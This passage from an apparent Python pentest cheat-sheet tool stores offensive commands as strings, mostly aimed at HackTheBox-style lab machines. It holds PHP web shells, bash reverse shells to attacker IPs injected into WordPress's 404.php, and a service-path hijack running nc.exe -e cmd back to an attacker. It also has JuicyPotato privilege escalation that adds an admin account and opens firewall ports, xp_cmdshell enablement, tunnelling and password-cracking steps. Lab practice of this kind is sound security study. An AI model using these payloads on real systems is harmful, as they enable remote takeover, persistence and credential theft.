scp username@x.x.x.x:/remote/directory/fileName /local/directory/fileName
"""

######################################
######################################

webShell = Cheat("WebShell - php")
webShell.category = "Web"
webShell.subCategory = "RCE"
webShell.output = f"""[*] Web Shell em PHP

<?php
	echo "\\nURL Shell... url?cmd=<command>\\n\\n";
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>

# Or...
<?php echo system($_GET['cmd']); exit; ?>

# Or...
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/{ip}/443 0>&1'");?>
"""

######################################
######################################

fakeShell = Cheat(
    "Fake Shell in bash for web shell with parameter and RCE - urlencoded"
)
fakeShell.category = "Web"
fakeShell.subCategory = "RCE"
fakeShell.output = """[*] Script in bash to simule shell via webshell RCE

#!/bin/bash

function ctrl_c() {
	echo -e "\n[!]Saindo...\n"
	exit 1
}
# Ctrl+C
trap ctrl_c INT

declare -r mainUrl="http://sec03.rentahacker.htb/shell.php"
declare -r paramName="hidden"

while true; do
	echo -n "[fakeShell ~] " && read -r command
	echo
	curl -s -X GET -G $mainUrl --data-urlencode "$paramName=$command"
	echo
done

"""

######################################
######################################

treeWorpress = Cheat(
    "Wordpress - WP - Tree/structure of basic wordpress path and files"
)
treeWorpress.category = "Web"
treeWorpress.subCategory = "CMS"
treeWorpress.output = """[*] Wordpress basic structure path and files

sudo wget http://wordpress.org/latest.tar.gz
tar -xf latest.tar.gz
tree -L 3 --dirsfirst . -f -x

.
└── ./wordpress
	├── ./wordpress/wp-admin
	│   ├── ./wordpress/wp-admin/css
	│   ├── ./wordpress/wp-admin/images
	│   ├── ./wordpress/wp-admin/includes
	│   ├── ./wordpress/wp-admin/js
	│   ├── ./wordpress/wp-admin/maint
	│   ├── ./wordpress/wp-admin/network
	│   ├── ./wordpress/wp-admin/user
	│   ├── ./wordpress/wp-admin/about.php
	│   ├── ./wordpress/wp-admin/admin-ajax.php
	│   ├── ./wordpress/wp-admin/admin-footer.php
	│   ├── ./wordpress/wp-admin/admin-functions.php
	│   ├── ./wordpress/wp-admin/admin-header.php
	│   ├── ./wordpress/wp-admin/admin.php
	│   ├── ./wordpress/wp-admin/admin-post.php
	│   ├── ./wordpress/wp-admin/async-upload.php
	│   ├── ./wordpress/wp-admin/authorize-application.php
	│   ├── ./wordpress/wp-admin/comment.php
	│   ├── ./wordpress/wp-admin/credits.php
	│   ├── ./wordpress/wp-admin/custom-background.php
	│   ├── ./wordpress/wp-admin/custom-header.php
	│   ├── ./wordpress/wp-admin/customize.php
	│   ├── ./wordpress/wp-admin/edit-comments.php
	│   ├── ./wordpress/wp-admin/edit-form-advanced.php
	│   ├── ./wordpress/wp-admin/edit-form-blocks.php
	│   ├── ./wordpress/wp-admin/edit-form-comment.php
	│   ├── ./wordpress/wp-admin/edit-link-form.php
	│   ├── ./wordpress/wp-admin/edit.php
	│   ├── ./wordpress/wp-admin/edit-tag-form.php
	│   ├── ./wordpress/wp-admin/edit-tags.php
	│   ├── ./wordpress/wp-admin/erase-personal-data.php
	│   ├── ./wordpress/wp-admin/export-personal-data.php
	│   ├── ./wordpress/wp-admin/export.php
	│   ├── ./wordpress/wp-admin/freedoms.php
	│   ├── ./wordpress/wp-admin/import.php
	│   ├── ./wordpress/wp-admin/index.php
	│   ├── ./wordpress/wp-admin/install-helper.php
	│   ├── ./wordpress/wp-admin/install.php
	│   ├── ./wordpress/wp-admin/link-add.php
	│   ├── ./wordpress/wp-admin/link-manager.php
	│   ├── ./wordpress/wp-admin/link-parse-opml.php
	│   ├── ./wordpress/wp-admin/link.php
	│   ├── ./wordpress/wp-admin/load-scripts.php
	│   ├── ./wordpress/wp-admin/load-styles.php
	│   ├── ./wordpress/wp-admin/media-new.php
	│   ├── ./wordpress/wp-admin/media.php
	│   ├── ./wordpress/wp-admin/media-upload.php
	│   ├── ./wordpress/wp-admin/menu-header.php
	│   ├── ./wordpress/wp-admin/menu.php
	│   ├── ./wordpress/wp-admin/moderation.php
	│   ├── ./wordpress/wp-admin/ms-admin.php
	│   ├── ./wordpress/wp-admin/ms-delete-site.php
	│   ├── ./wordpress/wp-admin/ms-edit.php
	│   ├── ./wordpress/wp-admin/ms-options.php
	│   ├── ./wordpress/wp-admin/ms-sites.php
	│   ├── ./wordpress/wp-admin/ms-themes.php
	│   ├── ./wordpress/wp-admin/ms-upgrade-network.php
	│   ├── ./wordpress/wp-admin/ms-users.php
	│   ├── ./wordpress/wp-admin/my-sites.php
	│   ├── ./wordpress/wp-admin/nav-menus.php
	│   ├── ./wordpress/wp-admin/network.php
	│   ├── ./wordpress/wp-admin/options-discussion.php
	│   ├── ./wordpress/wp-admin/options-general.php
	│   ├── ./wordpress/wp-admin/options-head.php
	│   ├── ./wordpress/wp-admin/options-media.php
	│   ├── ./wordpress/wp-admin/options-permalink.php
	│   ├── ./wordpress/wp-admin/options.php
	│   ├── ./wordpress/wp-admin/options-privacy.php
	│   ├── ./wordpress/wp-admin/options-reading.php
	│   ├── ./wordpress/wp-admin/options-writing.php
	│   ├── ./wordpress/wp-admin/plugin-editor.php
	│   ├── ./wordpress/wp-admin/plugin-install.php
	│   ├── ./wordpress/wp-admin/plugins.php
	│   ├── ./wordpress/wp-admin/post-new.php
	│   ├── ./wordpress/wp-admin/post.php
	│   ├── ./wordpress/wp-admin/press-this.php
	│   ├── ./wordpress/wp-admin/privacy.php
	│   ├── ./wordpress/wp-admin/privacy-policy-guide.php
	│   ├── ./wordpress/wp-admin/profile.php
	│   ├── ./wordpress/wp-admin/revision.php
	│   ├── ./wordpress/wp-admin/setup-config.php
	│   ├── ./wordpress/wp-admin/site-health-info.php
	│   ├── ./wordpress/wp-admin/site-health.php
	│   ├── ./wordpress/wp-admin/term.php
	│   ├── ./wordpress/wp-admin/theme-editor.php
	│   ├── ./wordpress/wp-admin/theme-install.php
	│   ├── ./wordpress/wp-admin/themes.php
	│   ├── ./wordpress/wp-admin/tools.php
	│   ├── ./wordpress/wp-admin/update-core.php
	│   ├── ./wordpress/wp-admin/update.php
	│   ├── ./wordpress/wp-admin/upgrade-functions.php
	│   ├── ./wordpress/wp-admin/upgrade.php
	│   ├── ./wordpress/wp-admin/upload.php
	│   ├── ./wordpress/wp-admin/user-edit.php
	│   ├── ./wordpress/wp-admin/user-new.php
	│   ├── ./wordpress/wp-admin/users.php
	│   ├── ./wordpress/wp-admin/widgets-form-blocks.php
	│   ├── ./wordpress/wp-admin/widgets-form.php
	│   └── ./wordpress/wp-admin/widgets.php
	├── ./wordpress/wp-content
	│   ├── ./wordpress/wp-content/plugins
	│   ├── ./wordpress/wp-content/themes
	│   └── ./wordpress/wp-content/index.php
	├── ./wordpress/wp-includes
	│   ├── ./wordpress/wp-includes/assets
	│   ├── ./wordpress/wp-includes/block-patterns
	│   ├── ./wordpress/wp-includes/blocks
	│   ├── ./wordpress/wp-includes/block-supports
	│   ├── ./wordpress/wp-includes/certificates
	│   ├── ./wordpress/wp-includes/css
	│   ├── ./wordpress/wp-includes/customize
	│   ├── ./wordpress/wp-includes/fonts
	│   ├── ./wordpress/wp-includes/ID3
	│   ├── ./wordpress/wp-includes/images
	│   ├── ./wordpress/wp-includes/IXR
	│   ├── ./wordpress/wp-includes/js
	│   ├── ./wordpress/wp-includes/PHPMailer
	│   ├── ./wordpress/wp-includes/pomo
	│   ├── ./wordpress/wp-includes/random_compat
	│   ├── ./wordpress/wp-includes/Requests
	│   ├── ./wordpress/wp-includes/rest-api
	│   ├── ./wordpress/wp-includes/SimplePie
	│   ├── ./wordpress/wp-includes/sitemaps
	│   ├── ./wordpress/wp-includes/sodium_compat
	│   ├── ./wordpress/wp-includes/Text
	│   ├── ./wordpress/wp-includes/theme-compat
	│   ├── ./wordpress/wp-includes/widgets
	│   ├── ./wordpress/wp-includes/admin-bar.php
	│   ├── ./wordpress/wp-includes/atomlib.php
	│   ├── ./wordpress/wp-includes/author-template.php
	│   ├── ./wordpress/wp-includes/block-editor.php
	│   ├── ./wordpress/wp-includes/block-patterns.php
	│   ├── ./wordpress/wp-includes/blocks.php
	│   ├── ./wordpress/wp-includes/block-template.php
	│   ├── ./wordpress/wp-includes/block-template-utils.php
	│   ├── ./wordpress/wp-includes/bookmark.php
	│   ├── ./wordpress/wp-includes/bookmark-template.php
	│   ├── ./wordpress/wp-includes/cache-compat.php
	│   ├── ./wordpress/wp-includes/cache.php
	│   ├── ./wordpress/wp-includes/canonical.php
	│   ├── ./wordpress/wp-includes/capabilities.php
	│   ├── ./wordpress/wp-includes/category.php
	│   ├── ./wordpress/wp-includes/category-template.php
	│   ├── ./wordpress/wp-includes/class-feed.php
	│   ├── ./wordpress/wp-includes/class-http.php
	│   ├── ./wordpress/wp-includes/class-IXR.php
	│   ├── ./wordpress/wp-includes/class-json.php
	│   ├── ./wordpress/wp-includes/class-oembed.php
	│   ├── ./wordpress/wp-includes/class-phpass.php
	│   ├── ./wordpress/wp-includes/class-phpmailer.php
	│   ├── ./wordpress/wp-includes/class-pop3.php
	│   ├── ./wordpress/wp-includes/class-requests.php
	│   ├── ./wordpress/wp-includes/class-simplepie.php
	│   ├── ./wordpress/wp-includes/class-smtp.php
	│   ├── ./wordpress/wp-includes/class-snoopy.php
	│   ├── ./wordpress/wp-includes/class-walker-category-dropdown.php
	│   ├── ./wordpress/wp-includes/class-walker-category.php
	│   ├── ./wordpress/wp-includes/class-walker-comment.php
	│   ├── ./wordpress/wp-includes/class-walker-nav-menu.php
	│   ├── ./wordpress/wp-includes/class-walker-page-dropdown.php
	│   ├── ./wordpress/wp-includes/class-walker-page.php
	│   ├── ./wordpress/wp-includes/class-wp-admin-bar.php
	│   ├── ./wordpress/wp-includes/class-wp-ajax-response.php
	│   ├── ./wordpress/wp-includes/class-wp-application-passwords.php
	│   ├── ./wordpress/wp-includes/class-wp-block-editor-context.php
	│   ├── ./wordpress/wp-includes/class-wp-block-list.php
	│   ├── ./wordpress/wp-includes/class-wp-block-parser.php
	│   ├── ./wordpress/wp-includes/class-wp-block-pattern-categories-registry.php
	│   ├── ./wordpress/wp-includes/class-wp-block-patterns-registry.php
	│   ├── ./wordpress/wp-includes/class-wp-block.php
	│   ├── ./wordpress/wp-includes/class-wp-block-styles-registry.php
	│   ├── ./wordpress/wp-includes/class-wp-block-supports.php
	│   ├── ./wordpress/wp-includes/class-wp-block-template.php
	│   ├── ./wordpress/wp-includes/class-wp-block-type.php
	│   ├── ./wordpress/wp-includes/class-wp-block-type-registry.php
	│   ├── ./wordpress/wp-includes/class-wp-comment.php
	│   ├── ./wordpress/wp-includes/class-wp-comment-query.php
	│   ├── ./wordpress/wp-includes/class-wp-customize-control.php
	│   ├── ./wordpress/wp-includes/class-wp-customize-manager.php
	│   ├── ./wordpress/wp-includes/class-wp-customize-nav-menus.php
	│   ├── ./wordpress/wp-includes/class-wp-customize-panel.php
	│   ├── ./wordpress/wp-includes/class-wp-customize-section.php
	│   ├── ./wordpress/wp-includes/class-wp-customize-setting.php
	│   ├── ./wordpress/wp-includes/class-wp-customize-widgets.php
	│   ├── ./wordpress/wp-includes/class-wp-date-query.php
	│   ├── ./wordpress/wp-includes/class.wp-dependencies.php
	│   ├── ./wordpress/wp-includes/class-wp-dependency.php
	│   ├── ./wordpress/wp-includes/class-wp-editor.php
	│   ├── ./wordpress/wp-includes/class-wp-embed.php
	│   ├── ./wordpress/wp-includes/class-wp-error.php
	│   ├── ./wordpress/wp-includes/class-wp-fatal-error-handler.php
	│   ├── ./wordpress/wp-includes/class-wp-feed-cache.php
	│   ├── ./wordpress/wp-includes/class-wp-feed-cache-transient.php
	│   ├── ./wordpress/wp-includes/class-wp-hook.php
	│   ├── ./wordpress/wp-includes/class-wp-http-cookie.php
	│   ├── ./wordpress/wp-includes/class-wp-http-curl.php
	│   ├── ./wordpress/wp-includes/class-wp-http-encoding.php
	│   ├── ./wordpress/wp-includes/class-wp-http-ixr-client.php
	│   ├── ./wordpress/wp-includes/class-wp-http-proxy.php
	│   ├── ./wordpress/wp-includes/class-wp-http-requests-hooks.php
	│   ├── ./wordpress/wp-includes/class-wp-http-requests-response.php
	│   ├── ./wordpress/wp-includes/class-wp-http-response.php
	│   ├── ./wordpress/wp-includes/class-wp-http-streams.php
	│   ├── ./wordpress/wp-includes/class-wp-image-editor-gd.php
	│   ├── ./wordpress/wp-includes/class-wp-image-editor-imagick.php
	│   ├── ./wordpress/wp-includes/class-wp-image-editor.php
	│   ├── ./wordpress/wp-includes/class-wp-list-util.php
	│   ├── ./wordpress/wp-includes/class-wp-locale.php
	│   ├── ./wordpress/wp-includes/class-wp-locale-switcher.php
	│   ├── ./wordpress/wp-includes/class-wp-matchesmapregex.php
	│   ├── ./wordpress/wp-includes/class-wp-metadata-lazyloader.php
	│   ├── ./wordpress/wp-includes/class-wp-meta-query.php
	│   ├── ./wordpress/wp-includes/class-wp-network.php
	│   ├── ./wordpress/wp-includes/class-wp-network-query.php
	│   ├── ./wordpress/wp-includes/class-wp-object-cache.php
	│   ├── ./wordpress/wp-includes/class-wp-oembed-controller.php
	│   ├── ./wordpress/wp-includes/class-wp-oembed.php
	│   ├── ./wordpress/wp-includes/class-wp-paused-extensions-storage.php
	│   ├── ./wordpress/wp-includes/class-wp.php
	│   ├── ./wordpress/wp-includes/class-wp-post.php
	│   ├── ./wordpress/wp-includes/class-wp-post-type.php
	│   ├── ./wordpress/wp-includes/class-wp-query.php
	│   ├── ./wordpress/wp-includes/class-wp-recovery-mode-cookie-service.php
	│   ├── ./wordpress/wp-includes/class-wp-recovery-mode-email-service.php
	│   ├── ./wordpress/wp-includes/class-wp-recovery-mode-key-service.php
	│   ├── ./wordpress/wp-includes/class-wp-recovery-mode-link-service.php
	│   ├── ./wordpress/wp-includes/class-wp-recovery-mode.php
	│   ├── ./wordpress/wp-includes/class-wp-rewrite.php
	│   ├── ./wordpress/wp-includes/class-wp-role.php
	│   ├── ./wordpress/wp-includes/class-wp-roles.php
	│   ├── ./wordpress/wp-includes/class.wp-scripts.php
	│   ├── ./wordpress/wp-includes/class-wp-session-tokens.php
	│   ├── ./wordpress/wp-includes/class-wp-simplepie-file.php
	│   ├── ./wordpress/wp-includes/class-wp-simplepie-sanitize-kses.php
	│   ├── ./wordpress/wp-includes/class-wp-site.php
	│   ├── ./wordpress/wp-includes/class-wp-site-query.php
	│   ├── ./wordpress/wp-includes/class.wp-styles.php
	│   ├── ./wordpress/wp-includes/class-wp-taxonomy.php
	│   ├── ./wordpress/wp-includes/class-wp-tax-query.php
	│   ├── ./wordpress/wp-includes/class-wp-term.php
	│   ├── ./wordpress/wp-includes/class-wp-term-query.php
	│   ├── ./wordpress/wp-includes/class-wp-text-diff-renderer-inline.php
	│   ├── ./wordpress/wp-includes/class-wp-text-diff-renderer-table.php
	│   ├── ./wordpress/wp-includes/class-wp-theme-json.php
	│   ├── ./wordpress/wp-includes/class-wp-theme-json-resolver.php
	│   ├── ./wordpress/wp-includes/class-wp-theme.php
	│   ├── ./wordpress/wp-includes/class-wp-user-meta-session-tokens.php
	│   ├── ./wordpress/wp-includes/class-wp-user.php
	│   ├── ./wordpress/wp-includes/class-wp-user-query.php
	│   ├── ./wordpress/wp-includes/class-wp-user-request.php
	│   ├── ./wordpress/wp-includes/class-wp-walker.php
	│   ├── ./wordpress/wp-includes/class-wp-widget-factory.php
	│   ├── ./wordpress/wp-includes/class-wp-widget.php
	│   ├── ./wordpress/wp-includes/class-wp-xmlrpc-server.php
	│   ├── ./wordpress/wp-includes/comment.php
	│   ├── ./wordpress/wp-includes/comment-template.php
	│   ├── ./wordpress/wp-includes/compat.php
	│   ├── ./wordpress/wp-includes/cron.php
	│   ├── ./wordpress/wp-includes/date.php
	│   ├── ./wordpress/wp-includes/default-constants.php
	│   ├── ./wordpress/wp-includes/default-filters.php
	│   ├── ./wordpress/wp-includes/default-widgets.php
	│   ├── ./wordpress/wp-includes/deprecated.php
	│   ├── ./wordpress/wp-includes/embed.php
	│   ├── ./wordpress/wp-includes/embed-template.php
	│   ├── ./wordpress/wp-includes/error-protection.php
	│   ├── ./wordpress/wp-includes/feed-atom-comments.php
	│   ├── ./wordpress/wp-includes/feed-atom.php
	│   ├── ./wordpress/wp-includes/feed.php
	│   ├── ./wordpress/wp-includes/feed-rdf.php
	│   ├── ./wordpress/wp-includes/feed-rss2-comments.php
	│   ├── ./wordpress/wp-includes/feed-rss2.php
	│   ├── ./wordpress/wp-includes/feed-rss.php
	│   ├── ./wordpress/wp-includes/formatting.php
	│   ├── ./wordpress/wp-includes/functions.php
	│   ├── ./wordpress/wp-includes/functions.wp-scripts.php
	│   ├── ./wordpress/wp-includes/functions.wp-styles.php
	│   ├── ./wordpress/wp-includes/general-template.php
	│   ├── ./wordpress/wp-includes/http.php
	│   ├── ./wordpress/wp-includes/https-detection.php
	│   ├── ./wordpress/wp-includes/https-migration.php
	│   ├── ./wordpress/wp-includes/kses.php
	│   ├── ./wordpress/wp-includes/l10n.php
	│   ├── ./wordpress/wp-includes/link-template.php
	│   ├── ./wordpress/wp-includes/load.php
	│   ├── ./wordpress/wp-includes/locale.php
	│   ├── ./wordpress/wp-includes/media.php
	│   ├── ./wordpress/wp-includes/media-template.php
	│   ├── ./wordpress/wp-includes/meta.php
	│   ├── ./wordpress/wp-includes/ms-blogs.php
	│   ├── ./wordpress/wp-includes/ms-default-constants.php
	│   ├── ./wordpress/wp-includes/ms-default-filters.php
	│   ├── ./wordpress/wp-includes/ms-deprecated.php
	│   ├── ./wordpress/wp-includes/ms-files.php
	│   ├── ./wordpress/wp-includes/ms-functions.php
	│   ├── ./wordpress/wp-includes/ms-load.php
	│   ├── ./wordpress/wp-includes/ms-network.php
	│   ├── ./wordpress/wp-includes/ms-settings.php
	│   ├── ./wordpress/wp-includes/ms-site.php
	│   ├── ./wordpress/wp-includes/nav-menu.php
	│   ├── ./wordpress/wp-includes/nav-menu-template.php
	│   ├── ./wordpress/wp-includes/option.php
	│   ├── ./wordpress/wp-includes/pluggable-deprecated.php
	│   ├── ./wordpress/wp-includes/pluggable.php
	│   ├── ./wordpress/wp-includes/plugin.php
	│   ├── ./wordpress/wp-includes/post-formats.php
	│   ├── ./wordpress/wp-includes/post.php
	│   ├── ./wordpress/wp-includes/post-template.php
	│   ├── ./wordpress/wp-includes/post-thumbnail-template.php
	│   ├── ./wordpress/wp-includes/query.php
	│   ├── ./wordpress/wp-includes/registration-functions.php
	│   ├── ./wordpress/wp-includes/registration.php
	│   ├── ./wordpress/wp-includes/rest-api.php
	│   ├── ./wordpress/wp-includes/revision.php
	│   ├── ./wordpress/wp-includes/rewrite.php
	│   ├── ./wordpress/wp-includes/robots-template.php
	│   ├── ./wordpress/wp-includes/rss-functions.php
	│   ├── ./wordpress/wp-includes/rss.php
	│   ├── ./wordpress/wp-includes/script-loader.php
	│   ├── ./wordpress/wp-includes/session.php
	│   ├── ./wordpress/wp-includes/shortcodes.php
	│   ├── ./wordpress/wp-includes/sitemaps.php
	│   ├── ./wordpress/wp-includes/spl-autoload-compat.php
	│   ├── ./wordpress/wp-includes/taxonomy.php
	│   ├── ./wordpress/wp-includes/template-canvas.php
	│   ├── ./wordpress/wp-includes/template-loader.php
	│   ├── ./wordpress/wp-includes/template.php
	│   ├── ./wordpress/wp-includes/theme-i18n.json
	│   ├── ./wordpress/wp-includes/theme.json
	│   ├── ./wordpress/wp-includes/theme.php
	│   ├── ./wordpress/wp-includes/theme-templates.php
	│   ├── ./wordpress/wp-includes/update.php
	│   ├── ./wordpress/wp-includes/user.php
	│   ├── ./wordpress/wp-includes/vars.php
	│   ├── ./wordpress/wp-includes/version.php
	│   ├── ./wordpress/wp-includes/widgets.php
	│   ├── ./wordpress/wp-includes/wlwmanifest.xml
	│   ├── ./wordpress/wp-includes/wp-db.php
	│   └── ./wordpress/wp-includes/wp-diff.php
	├── ./wordpress/index.php
	├── ./wordpress/license.txt
	├── ./wordpress/readme.html
	├── ./wordpress/wp-activate.php
	├── ./wordpress/wp-blog-header.php
	├── ./wordpress/wp-comments-post.php
	├── ./wordpress/wp-config-sample.php
	├── ./wordpress/wp-cron.php
	├── ./wordpress/wp-links-opml.php
	├── ./wordpress/wp-load.php
	├── ./wordpress/wp-login.php
	├── ./wordpress/wp-mail.php
	├── ./wordpress/wp-settings.php
	├── ./wordpress/wp-signup.php
	├── ./wordpress/wp-trackback.php
	└── ./wordpress/xmlrpc.php

36 directories, 320 files
"""

######################################
######################################

reverseShellWordpress = Cheat("RCE - Wordpress (WP)")
reverseShellWordpress.category = "Web"
reverseShellWordpress.subCategory = "RCE"
reverseShellWordpress.output = """[*] When authenticated, we can change the WordPress 404.php to get RCE

# edit 404.php
http://10.10.10.37/wp-admin/theme-editor.php?file=404.php&theme=twentyseventeen&scrollto=0

# Put something like a RCE, or a reverse shell directely in between the 404.php code...
	system("bash -c 'bash -i >& /dev/tcp/10.10.14.53/443 0>&1'");

# Access to 404.php
http://10.10.10.37/?p=404.php # Or http://10.10.10.37/?p=404.php&cmd=whoami if is a RCE
"""

######################################
######################################

ffuf = Cheat("ffuf - Fuzz Faster U Fool")
ffuf.category = "Tools"
ffuf.subCategory = "BruteForce"
ffuf.output = """[*] Virtual Host Discovery (without DNS records)

# Start by figurinf out the response length of false positive
> curl -s -H "Host: thatsubdomaindontexist.site.com" http://site.com | wc -c

612

# Filter out response and FUZZ Hosts
> ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://site.com -H "Host: FUZZ.site.com" -t 500 -fs 612
"""

######################################
######################################

chisel_portforwarding = Cheat("chisel - port forwarding - TCP/UDP tunnel")
chisel_portforwarding.category = "Tools"
chisel_portforwarding.subCategory = "Forwarding"
chisel_portforwarding.output = """[*] Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH, for port forwarding.

# https://github.com/jpillora/chisel/releases
# Server - is my kali machine waiting for connection.
sudo chisel server -p 8008 --reverse   # port 8008 is the port of the chisel server, where chisel comunicate to other chisel

# Client - is the target machine we want to bypass firewall rules, forwarding it
# Next example, we connect to kali machine on port 8008 (where server chisel is), and we say the kali port 80 is 127.0.0.1:80 of the target machine.
./chisel client 10.10.14.43:8008 R:80:127.0.0.1:80     

# We can connect more then one ports at same time...
./chisel client 10.10.14.43:8008 R:80:127.0.0.1:80 R:1337:127.0.0.1:1337 R:3306:127.0.0.1:3306 R:8000:127.0.0.1:8000 R:52352:127.0.0.1:52352
"""

######################################
######################################

jwt_openssl = Cheat("JWT - openssl | get certificate via openssl | self-signed certificate")
jwt_openssl.category = "Web"
jwt_openssl.subCategory = "Cookie"
jwt_openssl.output = """[*] Generate privKey to manipulate JWT token

openssl genrsa -out privKey.key 2048

[*] Get certificate of a website

openssl s_client -connect 10.10.10.162:443

[*] Create and trust self-signed certificate (With private ca.key of the target machine)
# Save public cerifications of the website
openssl s_client -connect 10.10.10.131:443 | openssl x509 > ca.cer

# With ca.cer and ca.key, create the client key and certificate
openssl genrsa -out client.key 4096
openssl req -new -key client.key -out client.req
openssl x509 -req -in client.req -set_serial 123 -CA ca.cer -CAkey ca.key -days 365 -extensions client -outform PEM -out client.cer

# Create the certificate for browser
openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
"""

######################################
######################################

juicyPotato = Cheat("JuicyPotato.exe - Windows - PrivEsc - SeImpersonatePrivilege")
juicyPotato.category = "Windows"
juicyPotato.subCategory = "PrivEsc via group"
juicyPotato.output = """[*] If in life you see SeImpersonatePrivilege, just use JuicyPotato!! =)

# Download JuicyPotato.exe and set a server http
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
sudo python3 -m http.server 80

# transfere to target machine
certutil -urlcache -f http://10.10.14.16/JuicyPotato.exe C:\\Temp\\JuicyPotato.exe

# Run! - Create a new user j4vali with password J4v4li123$!  
# (Close to always need a password like this!!)
# Run multiple times while showing OK!
cd C:\\Temp
.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user j4vali J4v4li123$! /add"
.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators j4vali /add"

# Add my ip to allow all traffic UDP and TCP
.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c powershell New-NetFirewallRule -DisplayName pwned -RemoteAddress 10.10.14.16 -Direction inbound -Action Allow"

# Add permission to execute command from out of the local system (cmd)
.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"

# Open Ports (cmd)
.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c netsh advfirewall firewall add rule name="Samba Port" protocol=TCP dir=in localport=445 action=allow"
.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c netsh advfirewall firewall add rule name="Samba Port" protocol=TCP dir=out localport=445 action=allow"
.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL"


# ------------------------------------------------------------------------
# Check if all correctly created (need to be \033[33;1m(Pwn3d!)\033[31;1m)
crackmapexec smb 10.10.10.93 -u 'j4vali' -p 'J4v4li123$!'

# On kali linux, we can now connect to the machine with ipexec.py or something like that:
psexec.py WORKGROUP/j4vali:@10.10.10.93 cmd.exe
"""

######################################
######################################

keepass = Cheat("keepassxc - Password Manager KeePass Manager")
keepass.category = "Tools"
keepass.subCategory = "Password"
keepass.output = """[*] Extract passwords of KeePass (GUI)

sudo install keepassxc
keepassxc  # GUI application

# For try cracking master password, use keepass2john
keepass2john tim.kdbx > hash
john --wordlist=/usr/share/wordlist/rockyou.txt hash
"""

######################################
######################################

sqsh = Cheat(
    "sqsh - sqsh - Interactive database shell (mysql for 1433/tcp  open  ms-sql-s) - mssqlclient.py"
)
sqsh.category = "Tools"
sqsh.subCategory = "Databases"
sqsh.output = """[*] sqsh - Interactive database shell

# Default Credentials are sa:sa OR sa without password (just press Enter)
sqsh -S 10.10.10.59 -U "sa"

# Commands:
# Try to execute comands on local machine
xp_cmdshell "whoami"
go

# If SQL Server blocked access to procedure...
sp_configure "show advanced options", 1
go
reconfigure
go
sp_configure "xp_cmdshell", 1
go
reconfigure
go

[*] mssqlclient.py - better then sqsh. Dont need "go"... all time xD

mssqlclient.py WORKGROUP/sa@10.10.10.59
xp_cmdshell "whoami"
sp_configure "show advanced options", 1
reconfigure
sp_configure "xp_cmdshell", 1
reconfigure
"""

######################################
######################################

x_forwarded_for = Cheat("X-Forwarded-For - Proxy - Header - XFF")
x_forwarded_for.category = "Web"
x_forwarded_for.subCategory = "XFF"
x_forwarded_for.output = """[*] The X-Forwarded-For (XFF) header is a de-facto standard header for identifying the originating IP address

# You can simule easily your connection was from another IP with curl, modifying the header (or burp or something like that)
curl -s -X GET 'http://10.10.10.167/admin.php' -H 'X-Forwarded-For: 192.168.4.28'
"""

######################################
######################################

checkenv = Cheat("Check Env if is 64 bits - Is64BitOperatingSystem - Is64BitProcess")
checkenv.category = "Windows"
checkenv.subCategory = "Powershell"
checkenv.output = """[*] Check Env on windows to make sure the environment is equal to the system

[Environment]::Is64BitOperatingSystem
[Environment]::Is64BitProcess
"""

######################################
######################################

seclogon = Cheat("sc - Service Control Manager and services")
seclogon.category = "Windows"
seclogon.subCategory = "PrivEsc"
seclogon.output = """[*] if you can modify any service registry, you can modify path to start another program instead

cmd /c sc query seclogon  # If stopped, we can modify path to start another program instead
reg query 'HKLM\system\currentcontrolset\services\seclogon'  # Get info service
reg add 'HKLM\system\currentcontrolset\services\seclogon' /t REG_EXPAND_SZ /v ImagePath /d 'C:\Windows\system32\spool\drivers\color\nc.exe -e cmd 10.10.14.16 4444' /f
cmd /c sc start seclogon
"""

######################################
######################################

bloodhound = Cheat("bloodhound-python / SharpHound - AD domain | neo4j - Windows")
bloodhound.category = "Windows"
bloodhound.subCategory = "Enumeration"
bloodhound.output = """[*] bloodhound-python - Enumerate All AD domain for bloodhound GUI in LOCAL

# The output of this command should give files.json for bloodhound GUI aplication
bloodhound-python -c All -u support -p '!00^BlackKnight' -d blackfield.local -ns 10.10.10.192 -dc blackfield.local

# start neo4j
sudo neo4j start

bloodhound &>/dev/null &


[*] SharpHound - Tranfere in the target machine sharphound for collect info for bloodhound GUI

wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1
# transfere to the target machine


"""

######################################
######################################

rpcclient = Cheat("rpcclient - MS-RPC - MSRPC - Windows")
rpcclient.category = "Windows"
rpcclient.subCategory = "RPC"
rpcclient.output = f"""[*] rpcclient - tool for executing client side MS-RPC functions

# rpcclient [-A authfile] [-c <command string>] [-d debuglevel] [-l logdir] [-N] [-s <smb config file>] [-U username[%password]] [-W workgroup] [-I destinationIP] {{BINDING-STRING|HOST}}

rpcclient -U '' -N 10.10.10.161      # Modo interativo anonymous sem password
rpcclient -U "SVC_TGS" 10.10.10.100  # Modo interativo - Pede contra-senha
rpcclient $> enumdomusers            # Enumera todos os usuários locais do sistema

# A mesma sequencia de commandos pode-se efetuar com um oneliner:
rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c "enumdomusers"
rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c "enumdomgroups"
rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c "querygroupmem 0x200"
rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c "queryuser 0x1f4"

# OneLiner para descobrir todos os usuários com permições administrador local
